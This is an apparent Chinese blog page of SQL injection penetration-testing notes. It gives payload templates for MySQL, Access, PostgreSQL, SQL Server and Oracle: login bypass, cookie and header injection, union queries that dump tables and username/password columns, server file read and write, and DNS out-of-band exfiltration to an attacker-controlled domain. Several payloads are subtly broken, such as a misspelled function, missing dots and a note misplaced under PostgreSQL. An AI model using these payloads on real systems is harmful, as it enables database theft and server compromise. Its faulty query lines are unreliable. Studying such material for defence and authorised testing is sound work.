<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><ul>
<li><p>在Burp中可以拦截包含Cookie的请求，发送到Repeater模块，通过修改Cookie的内容实现注入</p>
</li>
<li><p>也可以使用前端的控制台，通过JS的<code>document.cookie=</code>代码，修改Cookie的内容实现注入</p>
</li>
<li><p>Cookie中使用<code>#</code>作为注释</p>
</li>
</ul>
<h3 id="其他位置的注入"><a href="#其他位置的注入" class="headerlink" title="其他位置的注入"></a>其他位置的注入</h3><h4 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h4><ul>
<li>如果代码中调用了User-Agent作为变量，可以在Burp中拦截包含user-agent的请求，发送到Repeater模块，通过修改User-Agent的内容实现注入</li>
</ul>
<h4 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h4><ul>
<li>如果代码中调用了Referer作为变量，可以在Burp中拦截包含user-agent的请求，发送到Repeater模块，通过修改Referer的内容实现注入</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h4><ul>
<li>查看版本是否大于5.0</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select verison()</span><br></pre></td></tr></table></figure>

<h4 id="获取当前用户名"><a href="#获取当前用户名" class="headerlink" title="获取当前用户名"></a>获取当前用户名</h4><ul>
<li>查看用户是否是root<ul>
<li>如果是root可以进行文件读写</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user()</span><br></pre></td></tr></table></figure>

<h4 id="获取操作系统"><a href="#获取操作系统" class="headerlink" title="获取操作系统"></a>获取操作系统</h4><ul>
<li>通过操作系统判断是否支持大小写</li>
<li>通过操作系统判断文件路径的斜线</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version_compile_os</span><br></pre></td></tr></table></figure>

<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select database()</span><br></pre></td></tr></table></figure>

<h4 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&lt;database_name&gt;&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><blockquote>
<p><code>table_schema</code>：指定数据库名的16进制数</p>
<blockquote>
<p><code>0x</code>：0x后拼接16进制数，这个十六进制数是由想要查询的数据库的库名通过<strong>字符串转16进制数</strong>转换来的</p>
<blockquote>
<p><code>concat()</code>：字符串拼接函数<br><code>hex()</code>：字符串转换为十六进制函数<br><code>database()</code>：获取数据库名函数<br><code>group_concat()</code>：将一组字符串拼接为一个字符串，以逗号分隔</p>
</blockquote>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select group_concat(table_name) from information_schema.tables where table_schema=concat(&#x27;0x&#x27;, hex(database())))</span><br></pre></td></tr></table></figure>

<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&lt;database_name&gt;&#x27; and table_name=&#x27;&lt;table_name&gt;&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select group_concat(column_name) from information_schema.columns where table_schema=concat(&#x27;0x&#x27;, hex(database())) and table_name=concat(&#x27;0x&#x27;, hex(database())))</span><br></pre></td></tr></table></figure>

<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select &lt;field_name&gt; from &lt;table_name&gt;)</span><br></pre></td></tr></table></figure>

<h5 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h5><blockquote>
<p><code>&lt;table_name&gt;</code>：数据表名<br><code>username</code>、<code>password</code>：想要查询的字段名<br><code>%20</code>：url编码后的空格字符串，用于分隔开展示的多条数据，防止混淆</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select concat(username,&#x27;%20&#x27;,password) from &lt;table_name&gt;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>0x3a</code>：十六进制编码后的冒号字符串，用于分隔开展示的多条数据，防止混淆</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select</span><br><span class="line">  (select concat(username,&#x27;0x3a&#x27;,password) from &lt;table_name&gt;)</span><br></pre></td></tr></table></figure>

<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><h4 id="检测当前用户是否具有文件读写权限"><a href="#检测当前用户是否具有文件读写权限" class="headerlink" title="检测当前用户是否具有文件读写权限"></a>检测当前用户是否具有文件读写权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT File_priv FROM mysql.user WHERE user=&#x27;root&#x27; AND host=&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><blockquote>
<p><code>&lt;file&gt;</code>：想要读取的文件的路径，Windows上可以使用<code>\\</code>分隔层级，Linux上可以使用<code>/</code>分隔层级</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select load_file(&#x27;&lt;file&gt;&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><blockquote>
<p><code>&lt;string&gt;</code>：通过查询语句获取的字符串<br><code>&lt;file&gt;</code>：想要写入的文件</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;&lt;string&gt;&#x27; into outfile &#x27;&lt;file&gt;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ul>
<li>多句SQL压缩为一句进行注入</li>
<li>支持堆叠注入的数据库必须具有结束分割符，如：<code>MySQL</code>、<code>MSSQL</code>、<code>PostgreSQL</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union (select); show databases()</span><br></pre></td></tr></table></figure>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><ul>
<li>先通过新增接口和修改接口将想要注入的SQL语句写入数据库，再通过查询接口执行SQL语句</li>
</ul>
<h3 id="DNS带外"><a href="#DNS带外" class="headerlink" title="DNS带外"></a>DNS带外</h3><ul>
<li>在极端情况下，目标站点没有向外访问除了DNS协议以外的协议的权限，此时可以利用MySQL的文件加载函数，向自己的DNS服务器发送请求，从而泄露数据</li>
</ul>
<ol>
<li>创建一个监听53端口的服务，且允许子域名传递任意值都能被正确访问（<code>*.example.com</code>）</li>
<li>利用SQL注入访问自己部署得服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 and (select load_file(concat(&quot;//&quot;, (&lt;select&gt;), &quot;.example.com&quot;)))</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看请求者请求的域名，其中子域名携带的内容就是泄露的数据</li>
</ol>
<h2 id="Access渗透测试"><a href="#Access渗透测试" class="headerlink" title="Access渗透测试"></a>Access渗透测试</h2><ul>
<li>与MySQL渗透测试基本相同，但Access不存在文件读写权限</li>
</ul>
<h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ul>
<li>Access数据库在使用查询语句时，必须使用<code>from &lt;database_name&gt;</code>关键字，而且数据库名必须存在</li>
</ul>
<blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select_1&gt; union &lt;select_2&gt; from &lt;database_name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h3><ul>
<li><p>如果表名或列明猜不到，可以采用偏移注入，随机爆破数据</p>
</li>
<li><p>减少6个注入点，用<code>*</code>代替</p>
</li>
</ul>
<blockquote>
<p><code>&lt;table_name&gt;</code>：数据表名</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3,4,5,6,7,8,9,* from (&lt;table_name&gt; as a inner join &lt;table_name&gt; as b on a.id=b.id)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果爆破失败，可以继续减少6个注入点，以此类推，直至注入点不足</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3,* from ((&lt;table_name&gt; as a inner join &lt;table_name&gt; as b on a.id=b.id) inner join &lt;table_name&gt; as c on a.id=c.id)</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL渗透测试"><a href="#PostgreSQL渗透测试" class="headerlink" title="PostgreSQL渗透测试"></a>PostgreSQL渗透测试</h2><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select_1&gt; union &lt;select_2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意：Access数据库在使用查询语句时，必须使用<code>from &lt;database_name&gt;</code>关键字，而且数据库名必须存在</li>
</ul>
<h4 id="注入点个数测试-1"><a href="#注入点个数测试-1" class="headerlink" title="注入点个数测试"></a>注入点个数测试</h4><ul>
<li>使用<code>null</code>作为注入点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null</span><br></pre></td></tr></table></figure>

<h4 id="注入点位置测试-1"><a href="#注入点位置测试-1" class="headerlink" title="注入点位置测试"></a>注入点位置测试</h4><ul>
<li>使用<code>&#39;null&#39;</code>作为注入点时，如果存在注入点回显，会回显为<code>null</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;null&#x27;,null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,&#x27;null&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取数据库版本-1"><a href="#获取数据库版本-1" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select version()</span><br></pre></td></tr></table></figure>

<h4 id="获取当前用户名-1"><a href="#获取当前用户名-1" class="headerlink" title="获取当前用户名"></a>获取当前用户名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select current_user</span><br></pre></td></tr></table></figure>

<h3 id="脱库-1"><a href="#脱库-1" class="headerlink" title="脱库"></a>脱库</h3><h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select current_database()</span><br></pre></td></tr></table></figure>

<h4 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(datname,&#x27;,&#x27;) from pg_database</span><br></pre></td></tr></table></figure>

<h4 id="获取数据表名-1"><a href="#获取数据表名-1" class="headerlink" title="获取数据表名"></a>获取数据表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(tablename,&#x27;,&#x27;) from pg_tables where schemaname=&#x27;&lt;database_name&gt;&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(tablename,&#x27;,&#x27;) from pg_stat_user_tables</span><br></pre></td></tr></table></figure>

<h4 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(tablename,&#x27;,&#x27;) from information_schema columns where table_name=&#x27;&lt;table_name&gt;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(&lt;field_name&gt;,&#x27;,&#x27;) from &lt;table_name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="查询DBA用户的用户名"><a href="#查询DBA用户的用户名" class="headerlink" title="查询DBA用户的用户名"></a>查询DBA用户的用户名</h3><ul>
<li>如果当前用户是DBA用户，可以进行文件读写</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select string_agg(usename,&#x27;,&#x27;) from pg_user where usesuper is true</span><br></pre></td></tr></table></figure>

<h2 id="SQLServer渗透测试"><a href="#SQLServer渗透测试" class="headerlink" title="SQLServer渗透测试"></a>SQLServer渗透测试</h2><h3 id="联合查询注入-3"><a href="#联合查询注入-3" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select_1&gt; union &lt;select_2&gt;</span><br></pre></td></tr></table></figure>

<h4 id="注入点个数测试-2"><a href="#注入点个数测试-2" class="headerlink" title="注入点个数测试"></a>注入点个数测试</h4><ul>
<li>使用<code>null</code>作为注入点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null</span><br></pre></td></tr></table></figure>

<h4 id="注入点位置测试-2"><a href="#注入点位置测试-2" class="headerlink" title="注入点位置测试"></a>注入点位置测试</h4><ul>
<li>使用<code>&#39;null&#39;</code>作为注入点时，如果存在注入点回显，会回显为<code>null</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;null&#x27;,null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,&#x27;null&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取数据库版本-2"><a href="#获取数据库版本-2" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version</span><br></pre></td></tr></table></figure>

<h4 id="获取当前用户名-2"><a href="#获取当前用户名-2" class="headerlink" title="获取当前用户名"></a>获取当前用户名</h4><h5 id="当前数据库用户"><a href="#当前数据库用户" class="headerlink" title="当前数据库用户"></a>当前数据库用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select current_user</span><br></pre></td></tr></table></figure>

<h5 id="系统用户"><a href="#系统用户" class="headerlink" title="系统用户"></a>系统用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select system_user</span><br></pre></td></tr></table></figure>

<h4 id="获取操作系统-1"><a href="#获取操作系统-1" class="headerlink" title="获取操作系统"></a>获取操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@servername</span><br></pre></td></tr></table></figure>

<h3 id="脱库-2"><a href="#脱库-2" class="headerlink" title="脱库"></a>脱库</h3><h4 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select db_name()</span><br></pre></td></tr></table></figure>

<h4 id="获取数据表名-2"><a href="#获取数据表名-2" class="headerlink" title="获取数据表名"></a>获取数据表名</h4><h5 id="获取当前表名"><a href="#获取当前表名" class="headerlink" title="获取当前表名"></a>获取当前表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union all select (select top 1 name from &lt;database_name&gt;.&lt;user_name&gt;.sysobjects where xtype=&#x27;u&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="获取其他表名"><a href="#获取其他表名" class="headerlink" title="获取其他表名"></a>获取其他表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union all select (select top 1 name from &lt;database_name&gt;.&lt;user_name&gt;.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;&lt;table_name&gt;&#x27;))</span><br></pre></td></tr></table></figure>

<h4 id="获取字段名-2"><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h4><blockquote>
<p><code>&lt;index&gt;</code>：字段索引</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union all select (select top 1 col_name(object_id(&#x27;&lt;table_name&gt;&#x27;), &lt;index&gt;) from sysobjects)</span><br></pre></td></tr></table></figure>

<h4 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union all select (select &lt;field_name&gt; from &lt;table_name&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="Oracle渗透测试"><a href="#Oracle渗透测试" class="headerlink" title="Oracle渗透测试"></a>Oracle渗透测试</h2><h3 id="联合查询注入-4"><a href="#联合查询注入-4" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select_1&gt; union &lt;select_2&gt; from dual</span><br></pre></td></tr></table></figure>

<h4 id="注入点个数测试-3"><a href="#注入点个数测试-3" class="headerlink" title="注入点个数测试"></a>注入点个数测试</h4><ul>
<li>Oracle需要使用<code>from dual</code>测试注入点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2 from dual</span><br></pre></td></tr></table></figure>

<h4 id="注入点位置测试-3"><a href="#注入点位置测试-3" class="headerlink" title="注入点位置测试"></a>注入点位置测试</h4><ul>
<li>依次添加<code>&#39;&#39;</code>，判定是否有回显点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;1&#x27;,2 from dual</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;1&#x27;,&#x27;2&#x27; from dual</span><br></pre></td></tr></table></figure>

<h3 id="脱库-3"><a href="#脱库-3" class="headerlink" title="脱库"></a>脱库</h3><h4 id="获取数据表名-3"><a href="#获取数据表名-3" class="headerlink" title="获取数据表名"></a>获取数据表名</h4><h5 id="准确查询"><a href="#准确查询" class="headerlink" title="准确查询"></a>准确查询</h5><ul>
<li>查询第1个数据表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select table_name from user_tables where rownum=1) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>查询第2个数据表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select table_name from user_tables where rownum=1 and table_name not in (&#x27;第1个数据表名&#x27;)) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>查询第3个数据表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select table_name from user_tables where rownum=1 and table_name not in (&#x27;第2个数据表名&#x27;)) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>以此类推</li>
</ul>
<h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select table_name from user_tables where rownum=1 and table_name like &#x27;%关键字%&#x27;) from dual</span><br></pre></td></tr></table></figure>

<h4 id="获取字段名-3"><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h4><h5 id="准确"><a href="#准确" class="headerlink" title="准确"></a>准确</h5><ul>
<li>查询第1个字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select column_name from all_tab_columns where rownum=1 and table_name=&#x27;&lt;table_name&gt;&#x27;) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>查询第2个字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select column_name from all_tab_columns where rownum=1 and column_name not in (&#x27;第1个字段名&#x27;) and table_name=&#x27;&lt;table_name&gt;&#x27;) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>查询第3个字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select column_name from all_tab_columns where rownum=1 and column_name not in (&#x27;第2个字段名&#x27;) and table_name=&#x27;&lt;table_name&gt;&#x27;) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>以此类推</li>
</ul>
<h4 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select (select &lt;field_name&gt; from &lt;table_name&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ul>
<li>查找执行SQL语句的代码，如果执行的SQL语句是从用户输入，则需要关注SQL注入攻击</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$results</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&#x27;&lt;sql&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qt41157pF/">哔哩哔哩——腾讯掌控安全学院</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Lf4y1t7Mc/">哔哩哔哩——千锋教育网络安全学院</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1EQ4y1y724/">哔哩哔哩——掌控安全学院</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ay4y1K7X6/">哔哩哔哩——逆风微笑的代码狗</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pQ4y1s7kH/">哔哩哔哩——xiaodisec</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
  <button>
    储钱罐
  </button>
  <div class="post-reward">
      <div>
        <img src="/assets/images/reward/images/wxpay.png" alt="57uv6Z6g 微信支付">
        <span>微信支付</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/alipay.png" alt="57uv6Z6g 支付宝">
        <span>支付宝</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/qqpay.png" alt="57uv6Z6g qqpay">
        <span>qqpay</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/bitcoin.png" alt="57uv6Z6g 比特币">
        <span>比特币</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/ethereum.png" alt="57uv6Z6g ethereum">
        <span>ethereum</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/monero.png" alt="57uv6Z6g monero">
        <span>monero</span>
      </div>
      <div>
